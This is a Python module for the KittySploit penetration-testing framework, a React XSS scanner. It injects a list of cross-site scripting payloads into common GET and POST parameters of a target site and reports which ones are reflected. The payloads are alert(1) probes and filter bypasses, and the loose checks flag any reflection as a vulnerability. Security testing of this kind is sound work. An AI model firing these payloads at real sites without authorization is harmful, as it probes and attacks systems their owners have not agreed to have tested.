#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re
import urllib.parse


class Module(Auxiliary, Http_client):
    
    __info__ = {
        'name': 'React XSS Scanner',
        'description': 'Scans for React-specific XSS vulnerabilities including JSX injection, dangerouslySetInnerHTML, and unsafe prop handling',
        'author': 'KittySploit Team',
        'tags': ['web', 'react', 'xss', 'scanner', 'security', 'injection'],
        'references': [
            'https://owasp.org/www-community/attacks/xss/',
            'https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml',
            'https://portswigger.net/web-security/cross-site-scripting',
        ]
    }

    # React XSS payloads
    REACT_PAYLOADS = [
        # Basic XSS
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        
        # React-specific
        '{alert(1)}',
        '{eval("alert(1)")}',
        '{Function("alert(1)")()}',
        '{setTimeout("alert(1)", 0)}',
        '{setInterval("alert(1)", 0)}',
        
        # dangerouslySetInnerHTML bypasses
        '<img src=x onerror={alert(1)}>',
        '<svg onload={alert(1)}>',
        '<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />',
        
        # JSX injection
        '${alert(1)}',
        '${eval("alert(1)")}',
        '${Function("alert(1)")()}',
        
        # Event handler injection
        'onClick={alert(1)}',
        'onError={alert(1)}',
        'onLoad={alert(1)}',
        'onMouseOver={alert(1)}',
        
        # Template literal injection
        '`${alert(1)}`',
        '${`${alert(1)}`}',
        
        # Bypass filters
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        '<img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>',
    ]

    # Parameter names commonly used with React
    REACT_PARAMS = [
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'name', 'value', 'id', 'key', 'data', 'input',
        'content', 'html', 'text', 'message', 'title',
        'description', 'comment', 'user', 'username',
    ]

    def check(self):
        """
        Check if the target is accessible and might be using React
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for React indicators
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                react_indicators = [
                    'react', 'react-dom', 'reactjs',
                    'data-reactroot', 'data-react',
                    '__reactinternalinstance', '__reactfiber',
                    'react.development.js', 'react.production.js',
                ]
                
                if any(indicator in content or indicator in headers for indicator in react_indicators):
                    return True
                
                # Check for React in script tags
                if re.search(r'<script[^>]*react', content, re.IGNORECASE):
                    return True
                
                # Even if not detected, continue scanning
                return True
            return False
        except Exception as e:
            return False

    def detect_react_version(self):
        """
        Detect React version from response
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None
            
            content = response.text
            
            # Check for React version in script tags
            version_match = re.search(r'react[\.-]?(\d+\.\d+\.\d+)', content, re.IGNORECASE)
            if version_match:
                return version_match.group(1)
            
            # Check for React in data attributes
            reactroot_match = re.search(r'data-reactroot', content, re.IGNORECASE)
            if reactroot_match:
                return 'React (version unknown)'
            
            # Check for React in comments
            if 'react' in content.lower() and ('jsx' in content.lower() or 'component' in content.lower()):
                return 'React (detected)'
            
            return None
        except Exception as e:
            print_debug(f"Error detecting React version: {str(e)}")
            return None

    def test_xss_payload(self, payload, param_name='q'):
        """
        Test an XSS payload against a parameter
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            
        Returns:
            dict: Test results
        """
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Test in query parameter
            test_path = f"/?{param_name}={encoded_payload}"
            response = self.http_request(
                method="GET",
                path=test_path,
                allow_redirects=False
            )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if payload is reflected
            is_reflected = payload in response.text or encoded_payload in response.text
            
            # Check for React-specific indicators
            is_react_vulnerable = False
            indicators = []
            
            # Check for dangerouslySetInnerHTML usage
            if 'dangerouslysetinnerhtml' in response.text.lower():
                is_react_vulnerable = True
                indicators.append('dangerouslySetInnerHTML detected')
            
            # Check for JSX injection
            if '{' in payload and '}' in payload:
                if payload.strip('{}') in response.text:
                    is_react_vulnerable = True
                    indicators.append('JSX expression detected')
            
            # Check for event handler injection
            if payload.startswith('on') and '=' in payload:
                if payload.split('=')[0].lower() in response.text.lower():
                    is_react_vulnerable = True
                    indicators.append('Event handler detected')
            
            # Check for JavaScript execution indicators
            js_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
            has_js_indicators = any(indicator in response.text.lower() for indicator in js_indicators)
            
            vulnerable = is_reflected or is_react_vulnerable
            
            return {
                'payload': payload,
                'param': param_name,
                'path': test_path,
                'vulnerable': vulnerable,
                'is_reflected': is_reflected,
                'is_react_vulnerable': is_react_vulnerable,
                'has_js_indicators': has_js_indicators,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_post_xss(self, payload, param_name='data'):
        """
        Test XSS payload via POST request
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            
        Returns:
            dict: Test results
        """
        try:
            # Test POST with form data
            post_data = {param_name: payload}
            response = self.http_request(
                method="POST",
                path="/",
                data=post_data
            )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if payload is reflected
            is_reflected = payload in response.text
            
            # Check for React-specific indicators
            is_react_vulnerable = False
            indicators = []
            
            if 'dangerouslysetinnerhtml' in response.text.lower():
                is_react_vulnerable = True
                indicators.append('dangerouslySetInnerHTML detected')
            
            vulnerable = is_reflected or is_react_vulnerable
            
            return {
                'payload': payload,
                'param': param_name,
                'method': 'POST',
                'vulnerable': vulnerable,
                'is_reflected': is_reflected,
                'is_react_vulnerable': is_react_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the React XSS scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting React XSS scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Detect React version
        print_status("Detecting React version...")
        version = self.detect_react_version()
        if version:
            print_success(f"React version detected: {version}")
        else:
            print_warning("Could not detect React version")
            print_info("Continuing with generic React XSS tests...")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.REACT_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.REACT_PAYLOADS[:10], 1):  # Test first 10 payloads per param
                result = self.test_xss_payload(payload, param)
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found with payload: {payload[:50]}...")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Reflected: {result.get('is_reflected', False)}")
                    print_info(f"      React-specific: {result.get('is_react_vulnerable', False)}")
                    if result.get('indicators'):
                        print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.REACT_PARAMS[:5]:  # Test first 5 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.REACT_PAYLOADS[:5]:  # Test first 5 payloads
                result = self.test_post_xss(payload, param)
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found (POST) with payload: {payload[:50]}...")
                    print_info(f"      Parameter: {param}")
                    if result.get('indicators'):
                        print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("React XSS Scan Summary")
        print_status("=" * 60)
        
        if version:
            print_info(f"React Version: {version}")
        else:
            print_warning("React Version: Not detected")
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_success("Vulnerabilities detected:")
            print_info("")
            
            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                status = 'React' if vuln.get('is_react_vulnerable') else ('Reflected' if vuln.get('is_reflected') else 'No')
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    status
                ])
            
            print_table(['Parameter', 'Method', 'Payload', 'Status'], table_data)
        else:
            print_info("No React XSS vulnerabilities detected.")
        
        return True
